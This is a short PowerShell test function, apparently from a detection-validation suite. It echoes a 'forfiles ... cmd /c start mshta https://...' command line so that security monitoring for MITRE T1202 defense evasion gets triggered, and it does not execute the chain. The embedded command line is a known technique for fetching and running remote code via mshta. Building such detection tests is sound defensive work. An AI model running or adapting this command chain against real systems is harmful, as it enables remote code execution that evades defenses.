﻿#Requires -Version 5.1
# Test-SOC1118 :: Forfiles abuse cmdline (forfiles+cmd+start+mshta+://)
# MITRE T1202 (Defense Evasion)  |  kind=echo  |  BENIGN validation
function Test-SOC1118 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'forfiles /p c:\windows /m *.exe /c "cmd /c start mshta https://example.com/ATRVAL_%RID%"'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1118' 'Forfiles abuse cmdline (forfiles+cmd+start+mshta+://)' 'Defense Evasion' 'T1202' $status $detail $marker)
}
